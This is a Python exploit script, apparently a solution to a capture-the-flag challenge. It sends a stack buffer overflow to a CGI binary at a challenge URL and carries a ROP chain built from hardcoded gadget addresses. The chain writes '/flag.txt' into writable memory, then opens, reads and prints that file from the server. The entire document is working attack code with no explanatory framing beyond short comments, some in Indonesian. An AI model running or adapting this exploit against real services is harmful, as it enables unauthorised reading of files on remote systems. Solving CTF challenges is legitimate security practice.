#!/usr/bin/env python3
import struct
import requests

# target
URL = "http://gzcli.techcomfest.1pc.tf:61555/cgi-bin/httpwn.cgi"

# gadgets / funcs (non-PIE static build dari dist)
POP_RDI = 0x401d80
POP_RSI = 0x40f772
POP_RDX_POP_RBX = 0x469877
MOV_QWORD_PTR_RDI_RDX = 0x430893  # mov [rdi], rdx ; ret
OPEN  = 0x438600
READ  = 0x438730
WRITE = 0x4387d0
EXIT  = 0x408c70

# writable memory (.bss)
BSS_BASE = 0x4a7280
PATH_ADDR = BSS_BASE + 0x100
BUF_ADDR  = BSS_BASE + 0x200

def p64(x): return struct.pack("<Q", x)

def write_qword(addr, val_qword):
    # rdi = addr; rdx = val; [rdi] = rdx
    return b"".join([
        p64(POP_RDI), p64(addr),
        p64(POP_RDX_POP_RBX), p64(val_qword), p64(0),
        p64(MOV_QWORD_PTR_RDI_RDX),
    ])

# "/flag.txt\x00" -> 2 qword writes
chunk1 = struct.unpack("<Q", b"/flag.tx")[0]  # 8 bytes
chunk2 = 0x74  # 't' + null padding => 0x0000000000000074

rop  = b""
rop += write_qword(PATH_ADDR,   chunk1)
rop += write_qword(PATH_ADDR+8, chunk2)

# open("/flag.txt", O_RDONLY, 0)
rop += b"".join([
    p64(POP_RDI), p64(PATH_ADDR),
    p64(POP_RSI), p64(0),
    p64(POP_RDX_POP_RBX), p64(0), p64(0),
    p64(OPEN),
])

# read(fd=3, BUF, 0x100)
# NOTE: kalau output kosong, coba ganti fd 3 -> 4 / 5 (tergantung inherited fds dari server)
rop += b"".join([
    p64(POP_RDI), p64(3),
    p64(POP_RSI), p64(BUF_ADDR),
    p64(POP_RDX_POP_RBX), p64(0x100), p64(0),
    p64(READ),
])

# write(1, BUF, 0x100)
rop += b"".join([
    p64(POP_RDI), p64(1),
    p64(POP_RSI), p64(BUF_ADDR),
    p64(POP_RDX_POP_RBX), p64(0x100), p64(0),
    p64(WRITE),
])

# exit(0)
rop += b"".join([
    p64(POP_RDI), p64(0),
    p64(EXIT),
])

# overflow layout:
# data starts @ rbp-0x60, saved RIP @ +0x68
payload = b"A" * 0x60 + b"B" * 8 + rop
# penting: jangan mulai dengan b"username=" supaya jalur error (no strcpy)

r = requests.post(URL, data=payload, headers={"Content-Type": "application/octet-stream"})
print(r.text)
